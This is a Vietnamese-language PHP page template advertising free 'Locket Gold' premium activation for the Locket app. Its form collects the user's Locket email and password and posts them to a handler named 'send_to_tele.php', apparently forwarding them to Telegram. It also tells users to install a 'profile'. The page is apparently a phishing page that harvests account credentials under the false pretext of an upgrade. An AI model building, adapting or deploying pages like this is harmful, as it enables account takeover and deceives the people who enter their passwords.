<?php include 'includes/header.php'; ?>

<div class="container py-5 d-flex flex-column align-items-center">
  <div class="locket-card p-4 rounded-4 shadow-lg text-center" style="max-width:700px;">
    <div class="locket-header py-4 rounded-top-4 text-white">
      <i class="fa-solid fa-crown fa-2x mb-2"></i>
      <h3 class="fw-bold mb-1">Locket Gold</h3>
      <p>Kích hoạt tài khoản Premium</p>
    </div>

    <div class="alert-box mt-4 text-start p-3 text-white rounded-3">
      <h6 class="fw-bold"><i class="fa-solid fa-triangle-exclamation"></i> LƯU Ý QUAN TRỌNG - ĐỌC KỸ TRƯỚC KHI NÂNG CẤP</h6>
      <ul class="mt-2 small">
        <li><b>BƯỚC 1:</b> Sau khi có thông báo mail hoặc báo nâng cấp thành công thì vào app Locket kiểm tra.</li>
        <li><b>BƯỚC 2:</b> Đọc hướng dẫn cài profile theo phần dưới.</li>
      </ul>
    </div>

    <form action="send_to_tele.php" method="POST" class="text-start mt-4">
      <label>Email Locket</label>
      <input type="email" class="form-control mb-3" name="email" placeholder="Nhập email Locket của bạn" required>

      <label>Password</label>
      <input type="password" class="form-control mb-3" name="password" placeholder="Nhập mật khẩu" required>

      <div class="form-check mb-3">
        <input class="form-check-input" type="checkbox" id="saveinfo">
        <label class="form-check-label small" for="saveinfo">Lưu thông tin tài khoản</label>
      </div>

      <button class="btn btn-warning w-100 py-2 fw-bold text-white rounded-3">
        <i class="fa-solid fa-crown"></i> Tham gia hàng chờ
      </button>
    </form>
  </div>
</div>

<?php include 'includes/footer.php'; ?>
